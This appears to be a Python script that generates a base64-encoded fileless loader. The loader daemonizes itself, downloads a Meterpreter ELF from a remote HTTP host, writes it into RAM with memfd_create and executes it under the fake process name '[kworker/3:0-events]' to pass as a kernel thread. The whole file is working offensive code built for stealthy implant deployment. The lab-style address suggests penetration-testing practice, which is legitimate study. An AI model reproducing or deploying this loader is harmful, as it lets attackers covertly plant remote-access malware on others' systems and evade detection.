import base64

# Here is our payload:
#    - The double fork() is used to deamonize our process.
#    - memfd_create() is used to write a file into RAM and not to disk.
code = '''
import os, requests
if os.fork()>0:
    exit(0)
os.chdir('/')
os.setsid()
os.umask(0)
if os.fork()>0:
    exit(0)
proto="http"
ip="10.0.2.2"
port="8000"
file="meterpreter.elf"
fd=os.memfd_create("")
r=requests.get(url=f"{proto}://{ip}:{port}/{file}", verify=False)
open(f"/proc/self/fd/{fd}", "wb").write(r.content)
os.execve(f"/proc/self/fd/{fd}", ["[kworker/3:0-events]"], {})
'''

# Here we print our payload encoded in base64.
encoded_code = base64.b64encode(code.encode())
print(encoded_code.decode())